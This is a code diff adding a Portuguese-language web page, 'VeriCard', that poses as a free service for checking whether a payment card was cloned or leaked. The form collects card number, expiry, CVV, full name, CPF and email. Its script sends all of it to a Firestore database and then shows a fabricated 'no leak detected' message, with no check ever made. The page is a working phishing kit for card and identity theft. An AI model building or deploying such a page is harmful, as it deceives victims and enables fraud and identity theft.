@@ -1,0 +1,302 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Verifique gratuitamente se seu cartão foi clonado ou vazado de forma segura">
+    <title>Verifique Seu Cartão</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="icon" href="https://images.pexels.com/photos/259200/pexels-photo-259200.jpeg?auto=compress&cs=tinysrgb&h=32" type="image/x-icon">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1E40AF 0%, #111827 100%);
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+        }
+        .card-info-img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+        }
+        .form-input {
+            background-color: #1f2937;
+            border: 1px solid #4b5563;
+            color: #ffffff;
+            padding: 0.75rem 0.75rem 0.75rem 2.5rem;
+            border-radius: 0.375rem;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #7C3AED;
+            box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.3);
+        }
+        .btn-primary {
+            background-color: #7C3AED;
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover {
+            background-color: #6D28D9;
+            transform: scale(1.05);
+        }
+        .input-icon {
+            position: absolute;
+            left: 0.75rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .animate-pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .free-banner {
+            background-color: #10B981;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    <header class="bg-gray-900 shadow-lg">
+        <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <img src="https://images.pexels.com/photos/259200/pexels-photo-259200.jpeg?auto=compress&cs=tinysrgb&h=40" alt="Logo" class="h-10">
+                <span class="logo">VeriCard</span>
+            </div>
+            <div class="space-x-4">
+                <a href="#home" class="text-gray-300 hover:text-white">Home</a>
+                <a href="#como-funciona" class="text-gray-300 hover:text-white">Como Funciona</a>
+                <a href="#contato" class="text-gray-300 hover:text-white">Contato</a>
+            </div>
+        </nav>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 flex-1">
+        <section id="home" class="text-center">
+            <div class="free-banner">
+                <i class="fas fa-check-circle mr-2"></i> Verificação 100% GRATUITA! Nenhum valor será cobrado.
+            </div>
+            <h2 class="text-4xl font-extrabold mb-4">Verifique se seu cartão foi comprometido</h2>
+            <p class="text-lg text-gray-300 mb-8">Proteja suas finanças! Insira os dados do cartão e suas informações pessoais para checar se houve clonagem ou vazamento, sem nenhum custo.</p>
+        </section>
+
+        <section id="como-funciona" class="mb-12">
+            <h3 class="text-2xl font-semibold mb-4">Onde encontrar as informações do cartão</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <div>
+                    <p class="text-gray-300 mb-4">Localize os dados do seu cartão nos seguintes lugares:</p>
+                    <ul class="list-disc list-inside text-gray-300 space-y-2">
+                        <li><strong>Número do Cartão</strong>: Frente do cartão, geralmente 16 dígitos.</li>
+                        <li><strong>Data de Validade</strong>: Frente, no formato MM/AA (ex.: 12/26).</li>
+                        <li><strong>CVV</strong>: Verso, 3 dígitos na faixa de assinatura.</li>
+                    </ul>
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <img src="https://images.pexels.com/photos/50987/money-card-business-credit-card-payment-finance-50987.jpeg?auto=compress&cs=tinysrgb&w=400" alt="Frente do cartão" class="card-info-img">
+                        <p class="text-sm text-gray-400 mt-2 text-center">Frente do cartão</p>
+                    </div>
+                    <div>
+                        <img src="https://images.pexels.com/photos/4968630/pexels-photo-4968630.jpeg?auto=compress&cs=tinysrgb&w=400" alt="Verso do cartão" class="card-info-img">
+                        <p class="text-sm text-gray-400 mt-2 text-center">Verso do cartão</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="verificar" class="bg-gray-800 p-8 rounded-lg shadow-lg">
+            <h3 class="text-2xl font-semibold mb-2 text-center">Insira os dados para verificação</h3>
+            <p class="text-sm text-gray-400 mb-6 text-center">Serviço gratuito, sem taxas ou assinaturas.</p>
+            <form id="verifyForm" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="input-wrapper">
+                    <label for="cardNumber" class="block text-sm font-medium text-gray-300">Número do Cartão</label>
+                    <i class="fas fa-credit-card input-icon"></i>
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" class="form-input" required>
+                </div>
+                <div class="input-wrapper">
+                    <label for="expiryDate" class="block text-sm font-medium text-gray-300">Data de Validade</label>
+                    <i class="fas fa-calendar-alt input-icon"></i>
+                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" class="form-input" required>
+                </div>
+                <div class="input-wrapper">
+                    <label for="cvv" class="block text-sm font-medium text-gray-300">CVV</label>
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" class="form-input" required>
+                </div>
+                <div class="input-wrapper">
+                    <label for="fullName" class="block text-sm font-medium text-gray-300">Nome Completo</label>
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" id="fullName" name="fullName" placeholder="João Silva" class="form-input" required>
+                </div>
+                <div class="input-wrapper">
+                    <label for="cpf" class="block text-sm font-medium text-gray-300">CPF</label>
+                    <i class="fas fa-id-card input-icon"></i>
+                    <input type="text" id="cpf" name="cpf" placeholder="123.456.789-00" class="form-input" required>
+                </div>
+                <div class="input-wrapper">
+                    <label for="email" class="block text-sm font-medium text-gray-300">E-mail</label>
+                    <i class="fas fa-envelope input-icon"></i>
+                    <input type="email" id="email" name="email" placeholder="exemplo@dominio.com" class="form-input" required>
+                </div>
+                <div class="md:col-span-2 text-center">
+                    <button type="submit" class="btn-primary text-white font-semibold py-3 px-6 rounded-lg"><i class="fas fa-shield-alt mr-2"></i> Verificar Agora</button>
+                </div>
+            </form>
+        </section>
+    </main>
+
+    <footer id="contato" class="bg-gray-900 py-6 text-center">
+        <p class="text-gray-300">Entre em contato: <a href="mailto:suporte@vericard.com" class="text-blue-400 hover:underline">suporte@vericard.com</a></p>
+        <p class="text-gray-400 mt-2">© 2025 VeriCard. Todos os direitos reservados.</p>
+    </footer>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js"></script>
+    <script>
+        // AVISO DE SEGURANÇA: Armazenar o número completo do cartão e CVV em texto puro no Firestore é arriscado.
+        // Em produção, use criptografia (ex.: AES) e autenticação no Firestore para proteger os dados.
+        // Considere armazenar apenas os últimos 4 dígitos do cartão e evitar salvar o CVV.
+
+        // Configuração do Firebase (SUBSTITUA pelos seus dados do Firebase Console)
+        const firebaseConfig = {
+            apiKey: "SUA_API_KEY",
+            authDomain: "SEU_PROJETO.firebaseapp.com",
+            projectId: "SEU_PROJETO",
+            storageBucket: "SEU_PROJETO.appspot.com",
+            messagingSenderId: "SEU_SENDER_ID",
+            appId: "SEU_APP_ID"
+        };
+
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Manipulação do formulário
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = {
+                cardNumber: formData.get('cardNumber'), // Armazena o número completo formatado
+                expiryDate: formData.get('expiryDate'),
+                cvv: formData.get('cvv'),
+                fullName: formData.get('fullName'),
+                cpf: formData.get('cpf'), // Armazena o CPF formatado
+                email: formData.get('email'),
+                timestamp: new Date().toISOString()
+            };
+
+            // Simulação de verificação e envio ao Firestore
+            const button = this.querySelector('button');
+            button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Verificando...';
+            button.classList.add('animate-pulse');
+
+            // Enviar para o Firestore
+            db.collection('card_verifications').add(data)
+                .then(() => {
+                    button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
+                    button.classList.remove('animate-pulse');
+                    alert(`Verificação concluída!\n\nNenhum vazamento detectado para o cartão ${data.cardNumber}.\nDados salvos com segurança. Um relatório foi enviado para ${data.email}.`);
+                })
+                .catch((error) => {
+                    button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
+                    button.classList.remove('animate-pulse');
+                    alert(`Erro ao salvar os dados: ${error.message}`);
+                });
+        });
+
+        // Máscaras de entrada para formatação em tempo real
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+            if (value.length > 16) value = value.slice(0, 16); // Limita a 16 dígitos
+            value = value.replace(/(\d{4})(\d)/, '$1 $2') // Adiciona espaço após 4 dígitos
+                        .replace(/(\d{4}) (\d{4})(\d)/, '$1 $2 $3')
+                        .replace(/(\d{4}) (\d{4}) (\d{4})(\d)/, '$1 $2 $3 $4');
+            e.target.value = value;
+        });
+
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+            if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dígitos
+            value = value.replace(/(\d{3})(\d)/, '$1.$2') // Adiciona ponto após 3 dígitos
+                        .replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
+                        .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+            e.target.value = value;
+        });
+
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            if (value.length >= 3) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.slice(0, 3);
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
